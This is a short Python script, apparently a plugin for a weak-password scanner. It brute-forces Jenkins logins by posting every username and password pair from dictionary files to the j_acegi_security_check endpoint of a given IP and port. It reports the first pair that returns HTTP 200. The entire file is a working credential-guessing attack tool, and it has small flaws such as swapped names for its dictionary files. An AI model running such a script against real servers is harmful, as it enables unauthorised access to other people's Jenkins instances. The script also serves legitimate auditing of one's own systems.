#encoding:utf-8
try:
    import os
    import requests
except:
    os._exit(6)
def check(ip,port):
    url = "http://"+ip+":"+str(port) + "/j_acegi_security_check"
    ufile = "../dic/dic_password_jenkins.txt"
    pfile = "../dic/dic_username_jenkins.txt"
    with open(ufile, "r") as uf:
        users = uf.read().split()
        with open(pfile, "r") as pf:
            pwds = pf.read().split()
            for user in users:
                for pwd in pwds:
                    data = {
                                "j_username" : user,
                                "j_password" : pwd,
                                "from" : "/asynchPeople/",
                                "Submit" : "Sign in"
                                }
                    try:
                        response = requests.post(url , data=data,timeout=2)
                        if response.status_code == 200:
                            print("{}:{}".format(user,pwd))
                            print("[+] {} find jenkins weak passwd".format(ip))
                            return 1
                    except Exception as e:
                        pass
            print("[-] {} do not found jenkins weak password".format(ip))
            return 2
            
def main(ip,port):
    get =  check(ip,port)
    os._exit(get)
if __name__ == "__main__":
    import sys 
    ip = sys.argv[1]
    port = sys.argv[2]
    main(ip,int(port))